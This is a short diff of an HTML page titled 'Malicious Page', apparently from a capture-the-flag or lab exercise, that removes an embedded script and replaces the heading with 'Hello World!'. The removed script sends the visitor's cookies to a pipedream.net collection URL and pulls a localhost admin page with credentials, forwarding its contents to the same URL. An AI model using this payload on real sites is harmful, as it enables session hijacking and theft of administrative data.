@@ -2,23 +2,8 @@
 <html>
 <head>
     <title>Malicious Page</title>
-    <script>
-        // Send the admin's cookies to your RequestBin
-        fetch('https://eoneud0rqkb43vu.m.pipedream.net?cookie=' + document.cookie);
-        
-        // Perform a CSRF attack to retrieve sensitive data
-        fetch('http://localhost/admin.php', {
-            method: 'GET',
-            credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Send the data to your RequestBin
-            fetch('https://eoneud0rqkb43vu.m.pipedream.net`?data=' + encodeURIComponent(data));
-        });
-    </script>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Hello World!</h1>
 </body>
 </html>
